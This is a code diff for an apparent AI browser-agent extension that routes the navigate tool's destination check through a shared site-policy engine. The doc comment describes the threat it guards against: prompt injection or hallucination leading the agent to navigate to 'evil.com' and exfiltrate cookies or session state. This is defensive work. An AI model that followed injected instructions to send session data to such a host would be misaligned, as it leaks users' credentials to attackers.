@@ -1,4 +1,5 @@
-import { SITE_ALLOWLIST_STORAGE_KEY, sanitizePageText } from '../../background/policy';
+import { sanitizePageText } from '../../background/policy';
+import { assertSiteAccess } from '../site-policy/store';
 import {
   browserControlConsentRequiredMessage,
   hasBrowserControlConsent,
@@ -595,51 +596,40 @@ export function scanForInjection(text: string): string | null {
   return null;
 }
 
-async function readSiteAllowlist(): Promise<ReadonlySet<string>> {
-  try {
-    const result = await chrome.storage.local.get([SITE_ALLOWLIST_STORAGE_KEY]);
-    const list = result[SITE_ALLOWLIST_STORAGE_KEY];
-    if (Array.isArray(list)) {
-      return new Set(list as string[]);
-    }
-  } catch {
-    /* noop */
-  }
-  return new Set<string>();
-}
-
 export function getOrigin(url: string): string {
   return new URL(url).origin;
 }
 
 /**
- * Asserts a destination URL's origin is on the user-managed site allowlist.
+ * Asserts the site policy admits browser automation on a destination URL.
  *
  * P0 SECURITY FIX (Day-2):
  *   cdpDriver.navigate previously only validated the URL scheme. A prompt-
  *   injection or model hallucination could call navigate("https://evil.com")
- *   and exfiltrate cookies / session state to an off-allowlist host.
+ *   and exfiltrate cookies / session state to an unapproved host.
  *
- *   We now read the same `agi_site_allowlist` that background.ts/policy.ts
- *   use for all other operations. If the destination origin is not on the
- *   list the CDP call is rejected BEFORE the tab moves.
+ *   The decision now runs through the shared site policy engine, so an origin
+ *   the org blocked is refused even while it sits on the user's own allowlist,
+ *   and the CDP call is rejected BEFORE the tab moves.
  *
- * @throws {Error} with a message starting "navigate: destination origin" when
- *   the origin is off-allowlist. This is caught by agentLoop → fed to model
- *   as a tool error so it can adapt (not crash the loop).
+ * @throws {Error} with a message starting "navigate: " when the policy denies.
+ *   This is caught by agentLoop → fed to model as a tool error so it can adapt
+ *   (not crash the loop).
  */
 export async function assertDestinationAllowlisted(url: string): Promise<void> {
   const parsed = new URL(url);
   if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
     throw new Error(`navigate: only http/https URLs allowed, got ${parsed.protocol}`);
   }
-  const origin = parsed.origin;
-  const allowlist = await readSiteAllowlist();
-  if (!allowlist.has(origin)) {
-    throw new Error(
-      `navigate: destination origin "${origin}" is not on your AGI site allowlist. ` +
+  try {
+    await assertSiteAccess(
+      url,
+      'automation',
+      `destination origin "${parsed.origin}" is not on your AGI site allowlist. ` +
         `Add it in the extension options before navigating there.`,
     );
+  } catch (error) {
+    throw new Error(`navigate: ${error instanceof Error ? error.message : String(error)}`);
   }
 }
 
